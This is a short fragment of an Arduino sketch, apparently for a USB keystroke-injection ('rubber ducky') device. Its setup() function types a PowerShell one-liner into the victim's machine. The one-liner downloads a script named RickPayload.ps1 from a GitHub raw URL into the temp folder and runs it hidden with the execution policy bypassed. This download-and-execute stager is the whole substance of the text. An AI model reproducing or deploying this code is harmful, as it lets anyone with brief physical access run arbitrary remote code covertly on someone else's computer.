...
void setup() {
  ...
  Keyboard.print("& {iwr -uri 'https://raw.githubusercontent.com/xXThanatosXx997/RubberD/main/RickPayload.ps1' -OutFile $env:temp\\payload.ps1; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:temp\\payload.ps1' -WindowStyle Hidden}\"");
